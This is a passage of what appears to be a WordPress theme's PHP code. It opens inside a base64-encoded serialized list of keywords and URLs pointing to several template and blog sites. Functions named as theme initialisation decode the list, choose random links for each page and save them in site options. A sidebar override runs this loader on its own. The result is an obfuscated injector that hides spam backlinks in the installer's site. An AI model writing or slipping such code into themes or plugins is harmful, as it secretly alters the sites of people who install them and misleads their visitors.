OiJKb29tbGEgVGVtcGxhdGVzIjtzOjY1OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1qb29tbGEtbmV3cy1hbmQtbWFnYXppbmUtdGVtcGxhdGVzLyI7czozMzoiQmVzdCBCb290c3RyYXAgQnVzaW5lc3MgVGVtcGxhdGVzIjtzOjU5OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1ib290c3RyYXAtYnVzaW5lc3MtdGVtcGxhdGVzLyI7czoyODoiQm9vdHN0cmFwIEJ1c2luZXNzIFRlbXBsYXRlcyI7czo1OToiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtYm9vdHN0cmFwLWJ1c2luZXNzLXRlbXBsYXRlcy8iO3M6MjU6IkJvb3RzdHJhcCBCdXNpbmVzcyBUaGVtZXMiO3M6NTk6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LWJvb3RzdHJhcC1idXNpbmVzcy10ZW1wbGF0ZXMvIjtzOjE4OiJCb290c3RyYXAgQnVzaW5lc3MiO3M6NTk6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LWJvb3RzdHJhcC1idXNpbmVzcy10ZW1wbGF0ZXMvIjtzOjM0OiJCZXN0IFRyYXZlbCBXZWJzaXRlIEhUTUwgVGVtcGxhdGVzIjtzOjYwOiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC10cmF2ZWwtd2Vic2l0ZS1odG1sLXRlbXBsYXRlcy8iO3M6NjoiVHJhdmVsIjtzOjYwOiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC10cmF2ZWwtd2Vic2l0ZS1odG1sLXRlbXBsYXRlcy8iO3M6Mjk6IlRyYXZlbCBXZWJzaXRlIEhUTUwgVGVtcGxhdGVzIjtzOjYwOiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC10cmF2ZWwtd2Vic2l0ZS1odG1sLXRlbXBsYXRlcy8iO3M6MjQ6IlRyYXZlbCBXZWJzaXRlIFRlbXBsYXRlcyI7czo2MDoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtdHJhdmVsLXdlYnNpdGUtaHRtbC10ZW1wbGF0ZXMvIjtzOjIwOiJUcmF2ZWwgV2ViIFRlbXBsYXRlcyI7czo2MDoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtdHJhdmVsLXdlYnNpdGUtaHRtbC10ZW1wbGF0ZXMvIjtzOjIxOiJUcmF2ZWwgSFRNTCBUZW1wbGF0ZXMiO3M6NjA6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LXRyYXZlbC13ZWJzaXRlLWh0bWwtdGVtcGxhdGVzLyI7czozMjoiRnJlc2ggRnJlZSBXb3JkUHJlc3MgTmV3cyBUaGVtZXMiO3M6NTg6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9mcmVzaC1mcmVlLXdvcmRwcmVzcy1uZXdzLXRoZW1lcy8iO3M6MjY6IkZyZWUgV29yZFByZXNzIE5ld3MgVGhlbWVzIjtzOjU4OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vZnJlc2gtZnJlZS13b3JkcHJlc3MtbmV3cy10aGVtZXMvIjtzOjIxOiJXb3JkUHJlc3MgTmV3cyBUaGVtZXMiO3M6NTg6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9mcmVzaC1mcmVlLXdvcmRwcmVzcy1uZXdzLXRoZW1lcy8iO3M6NDoibmV3cyI7czo1ODoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2ZyZXNoLWZyZWUtd29yZHByZXNzLW5ld3MtdGhlbWVzLyI7czoxNDoid29yZHByZXNzLW5ld3MiO3M6NTg6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9mcmVzaC1mcmVlLXdvcmRwcmVzcy1uZXdzLXRoZW1lcy8iO31pOjE7YToxMDp7czozMjoiaHR0cDovL3d3dy5kb2JyZXBvcmFkeS5iYmxvZy5wbC8iO3M6Mjg6Imh0dHA6Ly9kb2JyZXBvcmFkeS5iYmxvZy5wbC8iO3M6MzE6Imh0dHA6Ly93d3cuZG9icmVwb3JhZHkuYmJsb2cucGwiO3M6Mjg6Imh0dHA6Ly9kb2JyZXBvcmFkeS5iYmxvZy5wbC8iO3M6MjU6Ind3dy5kb2JyZXBvcmFkeS5iYmxvZy5wbC8iO3M6Mjg6Imh0dHA6Ly9kb2JyZXBvcmFkeS5iYmxvZy5wbC8iO3M6MjQ6Ind3dy5kb2JyZXBvcmFkeS5iYmxvZy5wbCI7czoyODoiaHR0cDovL2RvYnJlcG9yYWR5LmJibG9nLnBsLyI7czoyMToiZG9icmVwb3JhZHkuYmJsb2cucGwvIjtzOjI4OiJodHRwOi8vZG9icmVwb3JhZHkuYmJsb2cucGwvIjtzOjIwOiJkb2JyZXBvcmFkeS5iYmxvZy5wbCI7czoyODoiaHR0cDovL2RvYnJlcG9yYWR5LmJibG9nLnBsLyI7czoyODoiaHR0cDovL2RvYnJlcG9yYWR5LmJibG9nLnBsLyI7czoyODoiaHR0cDovL2RvYnJlcG9yYWR5LmJibG9nLnBsLyI7czoyNzoiaHR0cDovL2RvYnJlcG9yYWR5LmJibG9nLnBsIjtzOjI4OiJodHRwOi8vZG9icmVwb3JhZHkuYmJsb2cucGwvIjtzOjMyOiJodHRwOi8vd3d3LkRvYnJlUG9yYWR5LmJibG9nLnBsLyI7czoyODoiaHR0cDovL2RvYnJlcG9yYWR5LmJibG9nLnBsLyI7czoyMDoiRG9icmVwb3JhZHkuYmJsb2cucGwiO3M6Mjg6Imh0dHA6Ly9kb2JyZXBvcmFkeS5iYmxvZy5wbC8iO31pOjI7YTozMjp7czo0OiJoZXJlIjtzOjI1OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tIjtzOjQ6Im1vcmUiO3M6MjU6Imh0dHBzOi8vYm9vdHN0cmFwbWFkZS5jb20iO3M6NDoiYmxvZyI7czoyNToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbSI7czo5OiJib290c3RyYXAiO3M6MjU6Imh0dHBzOi8vYm9vdHN0cmFwbWFkZS5jb20iO3M6MTU6ImJvb3RzdHJhcCB0aGVtZSI7czoyNToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbSI7czoxNjoiYm9vdHN0cmFwIHRoZW1lcyI7czoyNToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbSI7czoxODoiYm9vdHN0cmFwIHRlbXBsYXRlIjtzOjI1OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tIjtzOjE5OiJib290c3RyYXAgdGVtcGxhdGVzIjtzOjI1OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tIjtzOjE3OiJCb290c3RyYXBNYWRlLmNvbSI7czoyNToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbSI7czoxMzoiQm9vdHN0cmFwTWFkZSI7czoyNToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbSI7czoyNDoicHJlbWl1bSBib290c3RyYXAgdGhlbWVzIjtzOjI1OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tIjtzOjI2OiJwcmVtaXVtIGJvb3RzdHJhcCB0ZW1wbGF0ZSI7czoyNToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbSI7czoyNzoicHJlbWl1bSBib290c3RyYXAgdGVtcGxhdGVzIjtzOjI1OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tIjtzOjIwOiJidXkgYm9vdHN0cmFwIHRoZW1lcyI7czoyNToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbSI7czoxNjoidGhlbWVzIGJvb3RzdHJhcCI7czoyNToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbSI7czoyMDoidGhlbWVzIGZvciBib290c3RyYXAiO3M6MjU6Imh0dHBzOi8vYm9vdHN0cmFwbWFkZS5jb20iO3M6MTk6InRlbXBsYXRlcyBib290c3RyYXAiO3M6MjU6Imh0dHBzOi8vYm9vdHN0cmFwbWFkZS5jb20iO3M6MTM6ImdldCBib290c3RyYXAiO3M6MjU6Imh0dHBzOi8vYm9vdHN0cmFwbWFkZS5jb20iO3M6MTI6ImdldGJvb3RzdHJhcCI7czoyNToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbSI7czoyNDoiYm9vdHN0cmFwIGh0bWwgdGVtcGxhdGVzIjtzOjU2OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tL3RoZW1lcy9jYXRlZ29yeS9odG1sLXRlbXBsYXRlLyI7czoyNjoiV29yZFByZXNzIGJvb3RzdHJhcCB0aGVtZXMiO3M6NTI6Imh0dHBzOi8vYm9vdHN0cmFwbWFkZS5jb20vdGhlbWVzL2NhdGVnb3J5L3dvcmRwcmVzcy8iO3M6MTk6IldvcmRQcmVzcyBib290c3RyYXAiO3M6NTI6Imh0dHBzOi8vYm9vdHN0cmFwbWFkZS5jb20vdGhlbWVzL2NhdGVnb3J5L3dvcmRwcmVzcy8iO3M6MjU6ImJvb3RzdHJhcCBhZG1pbiB0ZW1wYWx0ZXMiO3M6NzE6Imh0dHBzOi8vYm9vdHN0cmFwbWFkZS5jb20vdGhlbWVzL2NhdGVnb3J5L2h0bWwtdGVtcGxhdGUvYWRtaW4tdGVtcGxhdGUvIjtzOjIyOiJib290c3RyYXAgYWRtaW4gdGhlbWVzIjtzOjcxOiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tL3RoZW1lcy9jYXRlZ29yeS9odG1sLXRlbXBsYXRlL2FkbWluLXRlbXBsYXRlLyI7czoyNToiYm9vdHN0cmFwIGJ1c2luZXNzIHRoZW1lcyI7czo3NToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbS90aGVtZXMvY2F0ZWdvcnkvaHRtbC10ZW1wbGF0ZS9idXNpbmVzcy1jb3Jwb3JhdGUvIjtzOjI4OiJib290c3RyYXAgYnVzaW5lc3MgdGVtcGxhdGVzIjtzOjc1OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tL3RoZW1lcy9jYXRlZ29yeS9odG1sLXRlbXBsYXRlL2J1c2luZXNzLWNvcnBvcmF0ZS8iO3M6Mjk6ImJvb3RzdHJhcCBwb3J0Zm9saW8gdGVtcGxhdGVzIjtzOjc1OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tL3RoZW1lcy9jYXRlZ29yeS9odG1sLXRlbXBsYXRlL2NyZWF0aXZlLXBvcnRmb2xpby8iO3M6MjY6ImJvb3RzdHJhcCBwb3J0Zm9saW8gdGhlbWVzIjtzOjc1OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tL3RoZW1lcy9jYXRlZ29yeS9odG1sLXRlbXBsYXRlL2NyZWF0aXZlLXBvcnRmb2xpby8iO3M6MjM6ImJvb3RzdHJhcCBqb29tbGEgdGhlbWVzIjtzOjQ5OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tL3RoZW1lcy9jYXRlZ29yeS9qb29tbGEvIjtzOjIzOiJib290c3RyYXAgZHJ1cGFsIHRoZW1lcyI7czo0OToiaHR0cHM6Ly9ib290c3RyYXBtYWRlLmNvbS90aGVtZXMvY2F0ZWdvcnkvZHJ1cGFsLyI7czozMDoicmVzcG9uc2l2ZSBib290c3RyYXAgdGVtcGxhdGVzIjtzOjI1OiJodHRwczovL2Jvb3RzdHJhcG1hZGUuY29tIjtzOjI3OiJyZXNwb25zaXZlIGJvb3RzdHJhcCB0aGVtZXMiO3M6MjU6Imh0dHBzOi8vYm9vdHN0cmFwbWFkZS5jb20iO31pOjM7YToyNzp7czoyNDoiZnJlZSBib290c3RyYXAgdGVtcGxhdGVzIjtzOjI1OiJodHRwOi8vYm9vdHN0cmFwdGFzdGUuY29tIjtzOjIxOiJmcmVlIGJvb3RzdHJhcCB0aGVtZXMiO3M6MjU6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20iO3M6MTk6ImJvb3RzdHJhcCB0ZW1wbGF0ZXMiO3M6MjU6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20iO3M6MTY6ImJvb3RzdHJhcCB0aGVtZXMiO3M6MjU6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20iO3M6NDoiaGVyZSI7czoyNToiaHR0cDovL2Jvb3RzdHJhcHRhc3RlLmNvbSI7czo0OiJibG9nIjtzOjI1OiJodHRwOi8vYm9vdHN0cmFwdGFzdGUuY29tIjtzOjE4OiJCb290c3RyYXBUYXN0ZS5jb20iO3M6MjU6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20iO3M6MTQ6IkJvb3RzdHJhcFRhc3RlIjtzOjI1OiJodHRwOi8vYm9vdHN0cmFwdGFzdGUuY29tIjtzOjIwOiJmcmVlIGJvb3RzdHJhcCB0aGVtZSI7czoyNToiaHR0cDovL2Jvb3RzdHJhcHRhc3RlLmNvbSI7czoyNDoidGVtcGxhdGVzIGJvb3RzdHJhcCBmcmVlIjtzOjI1OiJodHRwOi8vYm9vdHN0cmFwdGFzdGUuY29tIjtzOjIzOiJ0ZW1wbGF0ZXMgZm9yIGJvb3RzdHJhcCI7czoyNToiaHR0cDovL2Jvb3RzdHJhcHRhc3RlLmNvbSI7czo5OiJib290c3RyYXAiO3M6MjU6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20iO3M6MTM6ImdldCBib290c3RyYXAiO3M6MjU6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20iO3M6Nzoid2Vic2l0ZSI7czoyNToiaHR0cDovL2Jvb3RzdHJhcHRhc3RlLmNvbSI7czo0OiJmcmVlIjtzOjI1OiJodHRwOi8vYm9vdHN0cmFwdGFzdGUuY29tIjtzOjk6IkJvb3RzdHJhcCI7czoyNToiaHR0cDovL2Jvb3RzdHJhcHRhc3RlLmNvbSI7czoyNToiYm9vdHN0cmFwIGFkbWluIHRlbXBsYXRlcyI7czo0NToiaHR0cDovL2Jvb3RzdHJhcHRhc3RlLmNvbS90YWcvYWRtaW4tdGVtcGxhdGUvIjtzOjMwOiJmcmVlIGJvb3RzdHJhcCBhZG1pbiB0ZW1wbGF0ZXMiO3M6NDU6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20vdGFnL2FkbWluLXRlbXBsYXRlLyI7czoyNjoiYm9vdHN0cmFwIHBvcnRmb2xpbyB0aGVtZXMiO3M6NDA6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20vdGFnL3BvcnRmb2xpby8iO3M6MzE6ImZyZWUgYm9vdHN0cmFwIHBvcnRmb2xpbyB0aGVtZXMiO3M6NDA6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20vdGFnL3BvcnRmb2xpby8iO3M6MzA6ImZyZWUgYm9vdHN0cmFwIGJ1c2luZXNzIHRoZW1lcyI7czozOToiaHR0cDovL2Jvb3RzdHJhcHRhc3RlLmNvbS90YWcvYnVzaW5lc3MvIjtzOjI1OiJib290c3RyYXAgYnVzaW5lc3MgdGhlbWVzIjtzOjM5OiJodHRwOi8vYm9vdHN0cmFwdGFzdGUuY29tL3RhZy9idXNpbmVzcy8iO3M6MjQ6ImJvb3RzdHJhcCB3ZWJzaXRlIHRoZW1lcyI7czoyNToiaHR0cDovL2Jvb3RzdHJhcHRhc3RlLmNvbSI7czoxMjoiZ2V0Ym9vdHN0cmFwIjtzOjI1OiJodHRwOi8vYm9vdHN0cmFwdGFzdGUuY29tIjtzOjE4OiJib290c3RyYXAgdGVtcGxhdGUiO3M6MjU6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20iO3M6MjM6ImJvb3RzdHJhcCB3ZWJzaXRlIHRoZW1lIjtzOjI1OiJodHRwOi8vYm9vdHN0cmFwdGFzdGUuY29tIjtzOjE1OiJib290c3RyYXAgdGhlbWUiO3M6MjU6Imh0dHA6Ly9ib290c3RyYXB0YXN0ZS5jb20iO319"; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>